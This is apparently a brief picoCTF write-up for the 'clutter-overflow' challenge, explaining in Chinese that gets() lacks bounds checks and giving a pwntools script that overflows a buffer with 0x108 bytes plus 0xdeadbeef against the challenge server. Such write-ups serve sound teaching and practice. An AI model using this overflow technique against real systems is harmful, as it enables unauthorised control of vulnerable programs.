# clutter-overflow 15
>Clutter, clutter everywhere and not a byte to use.
nc mars.picoctf.net 31890

# Slove
gets()不检查边界，bufferOverFlow即可覆盖tagert
```python
from pwn import *

p = remote("mars.picoctf.net", 31890)
p.sendline(b"a" * 0x108 + p32(0xdeadbeef))
p.interactive()
```